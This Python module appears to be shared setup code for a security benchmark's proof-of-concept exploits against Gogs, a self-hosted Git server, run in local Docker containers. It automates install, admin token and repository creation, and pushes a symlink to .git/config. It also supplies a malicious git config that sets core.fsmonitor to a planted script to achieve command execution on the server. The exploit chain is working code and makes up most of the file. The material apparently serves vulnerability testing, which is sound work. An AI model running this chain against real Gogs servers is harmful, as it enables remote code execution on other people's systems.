"""Shared utilities for Gogs benchmark case PoCs.

Handles Gogs installation, user setup, repo creation, and symlink push
for the git-config-write-through-symlink vulnerability chain.
"""
import base64
import os
import re
import subprocess
import tempfile
import time

import requests


ADMIN_USER = "pcbadmin"
ADMIN_PASS = "Admin12345!"
ADMIN_EMAIL = "admin@pcb.local"
REPO_NAME = "testrepo"

# Container names by version
CONTAINERS = {"v0": "pcb-gogs-v0", "v1": "pcb-gogs-v1", "v2": "pcb-gogs-v2"}
PORTS = {"v0": 23400, "v1": 23401, "v2": 23402}


def base_url(version: str) -> str:
    return f"http://127.0.0.1:{PORTS[version]}"


def wait_ready(version: str, timeout: int = 90) -> bool:
    """Wait until Gogs responds on HTTP."""
    url = base_url(version)
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            r = requests.get(f"{url}/", timeout=3)
            if r.status_code < 500:
                return True
        except Exception:
            pass
        time.sleep(2)
    return False


def install_gogs(version: str) -> bool:
    """Complete the first-run install wizard."""
    url = base_url(version)
    data = {
        "db_type": "SQLite3",
        "db_path": "/data/gogs/gogs.db",
        "app_name": "Gogs",
        "repo_root_path": "/data/git/gogs-repositories",
        "run_user": "git",
        "domain": "localhost",
        "ssh_port": "22",
        "http_port": "3000",
        "app_url": f"http://localhost:3000/",
        "log_root_path": "/data/gogs/log",
        "smtp_host": "",
        "admin_name": ADMIN_USER,
        "admin_passwd": ADMIN_PASS,
        "admin_confirm_passwd": ADMIN_PASS,
        "admin_email": ADMIN_EMAIL,
    }
    try:
        s = requests.Session()
        # Get install page for CSRF
        r = s.get(f"{url}/install", timeout=10)
        csrf = _extract_csrf(r.text)
        if csrf:
            data["_csrf"] = csrf
        # The install POST runs SQLite init + admin creation + a graceful self-restart. On a loaded
        # host that exceeds a 30s client timeout, which raised ReadTimeout -> install reported
        # failure -> no admin created -> create_token got 401. Gogs still finishes server-side, so
        # raise the budget and treat a timeout as "probably completed" (setup re-waits readiness).
        r = s.post(f"{url}/install", data=data, timeout=120, allow_redirects=False)
        return r.status_code in (200, 302, 303)
    except requests.exceptions.ReadTimeout:
        print("  install POST timed out (install likely completed server-side; will re-wait)")
        return True
    except Exception as e:
        print(f"  install error: {e}")
        return False


def create_token(version: str) -> str:
    """Create an API token for the admin user."""
    url = base_url(version)
    r = requests.post(
        f"{url}/api/v1/users/{ADMIN_USER}/tokens",
        auth=(ADMIN_USER, ADMIN_PASS),
        json={"name": f"pcb_token_{int(time.time())}"},
        timeout=10,
    )
    r.raise_for_status()
    return r.json()["sha1"]


def create_repo(version: str, token: str) -> dict:
    """Create a test repository and initialize it with an empty commit."""
    url = base_url(version)
    r = requests.post(
        f"{url}/api/v1/user/repos",
        headers={"Authorization": f"token {token}"},
        json={"name": REPO_NAME, "auto_init": False},
        timeout=15,
    )
    r.raise_for_status()
    repo_info = r.json()

    # Initialize with a git push (auto_init may fail on some Gogs versions)
    import tempfile
    clone_url = f"http://{ADMIN_USER}:{ADMIN_PASS}@127.0.0.1:{PORTS[version]}/{ADMIN_USER}/{REPO_NAME}.git"
    with tempfile.TemporaryDirectory() as tmpdir:
        repo_dir = os.path.join(tmpdir, REPO_NAME)
        os.makedirs(repo_dir)
        env = {**os.environ, "GIT_TERMINAL_PROMPT": "0",
               "GIT_AUTHOR_NAME": "test", "GIT_AUTHOR_EMAIL": "t@t",
               "GIT_COMMITTER_NAME": "test", "GIT_COMMITTER_EMAIL": "t@t"}
        subprocess.run(["git", "init", repo_dir], capture_output=True, timeout=10)
        subprocess.run(["git", "-C", repo_dir, "checkout", "-b", "master"],
                        capture_output=True, timeout=10)
        # Create a README
        with open(os.path.join(repo_dir, "README.md"), "w") as f:
            f.write("# test repo\n")
        subprocess.run(["git", "-C", repo_dir, "add", "."],
                        capture_output=True, timeout=10)
        subprocess.run(["git", "-C", repo_dir, "commit", "-m", "init"],
                        capture_output=True, timeout=10, env=env)
        subprocess.run(["git", "-C", repo_dir, "remote", "add", "origin", clone_url],
                        capture_output=True, timeout=10)
        r2 = subprocess.run(["git", "-C", repo_dir, "push", "-u", "origin", "master"],
                            capture_output=True, text=True, timeout=30, env=env)
        if r2.returncode != 0:
            print(f"  init push failed: {r2.stderr}")
    return repo_info


def push_symlink(version: str) -> bool:
    """Clone the repo, add a symlink link -> .git/config, push it."""
    url = base_url(version)
    clone_url = f"http://{ADMIN_USER}:{ADMIN_PASS}@127.0.0.1:{PORTS[version]}/{ADMIN_USER}/{REPO_NAME}.git"

    with tempfile.TemporaryDirectory() as tmpdir:
        repo_dir = os.path.join(tmpdir, REPO_NAME)
        # Clone
        r = subprocess.run(
            ["git", "clone", clone_url, repo_dir],
            capture_output=True, text=True, timeout=30,
            env={**os.environ, "GIT_TERMINAL_PROMPT": "0"},
        )
        if r.returncode != 0:
            print(f"  clone failed: {r.stderr}")
            return False

        # Create symlink: link -> .git/config
        link_path = os.path.join(repo_dir, "link")
        os.symlink(".git/config", link_path)

        # Stage and commit
        subprocess.run(
            ["git", "add", "link"],
            cwd=repo_dir, capture_output=True, timeout=10,
        )
        subprocess.run(
            ["git", "commit", "-m", "add link"],
            cwd=repo_dir, capture_output=True, timeout=10,
            env={**os.environ, "GIT_AUTHOR_NAME": "test", "GIT_AUTHOR_EMAIL": "t@t",
                 "GIT_COMMITTER_NAME": "test", "GIT_COMMITTER_EMAIL": "t@t"},
        )

        # Push
        r = subprocess.run(
            ["git", "push", "origin", "master"],
            cwd=repo_dir, capture_output=True, text=True, timeout=30,
            env={**os.environ, "GIT_TERMINAL_PROMPT": "0"},
        )
        if r.returncode != 0:
            print(f"  push failed: {r.stderr}")
            return False
    return True


def malicious_config() -> str:
    """Git config content that triggers core.fsmonitor to read the planted flag.

    Uses a pre-created script /data/pcb/fsmon.sh (planted by the Docker entrypoint)
    to avoid git config quoting issues with semicolons and quotes.
    """
    return (
        "[core]\n"
        "\trepositoryformatversion = 0\n"
        "\tfilemode = true\n"
        "\tbare = false\n"
        "\tfsmonitor = /data/pcb/fsmon.sh\n"
        "[remote \"origin\"]\n"
        f"\turl = /data/git/gogs-repositories/{ADMIN_USER}/{REPO_NAME}.git\n"
        "\tfetch = +refs/heads/*:refs/remotes/origin/*\n"
        "[branch \"master\"]\n"
        "\tremote = origin\n"
        "\tmerge = refs/heads/master\n"
    )


def read_flag_result(version: str) -> str:
    """Read the flag result file from the container via docker exec."""
    container = CONTAINERS[version]
    try:
        r = subprocess.run(
            ["docker", "exec", container, "cat", "/tmp/pcb_result.txt"],
            capture_output=True, text=True, timeout=10,
        )
        return r.stdout.strip()
    except Exception:
        return ""


def clear_flag_result(version: str):
    """Remove the flag result file before a new test."""
    container = CONTAINERS[version]
    subprocess.run(
        ["docker", "exec", container, "rm", "-f", "/tmp/pcb_result.txt"],
        capture_output=True, timeout=10,
    )


def setup_version(version: str) -> str:
    """Full setup: wait, install, create token, create repo, push symlink. Returns token."""
    print(f"  [{version}] Waiting for Gogs to be ready...")
    if not wait_ready(version):
        raise RuntimeError(f"Gogs {version} did not start")
    print(f"  [{version}] Installing...")
    install_gogs(version)
    time.sleep(2)
    # Gogs performs a graceful self-restart after the install wizard; wait for the HTTP listener to
    # come back before any authed API call, else create_token races the restart (401 / conn reset).
    wait_ready(version, timeout=120)
    print(f"  [{version}] Creating token...")
    token = None
    for _ in range(10):
        try:
            token = create_token(version)
            if token:
                break
        except Exception:
            pass
        time.sleep(3)
    if not token:
        raise RuntimeError(f"Gogs {version} token creation failed (install/admin not ready)")
    print(f"  [{version}] Creating repo...")
    create_repo(version, token)
    time.sleep(1)
    print(f"  [{version}] Pushing symlink...")
    if not push_symlink(version):
        raise RuntimeError(f"Failed to push symlink for {version}")
    time.sleep(1)
    return token


def _extract_csrf(html: str) -> str:
    m = re.search(r'name="_csrf"\s+(?:content|value)="([^"]+)"', html)
    if m:
        return m.group(1)
    m = re.search(r'_csrf.*?value="([^"]+)"', html)
    if m:
        return m.group(1)
    return ""
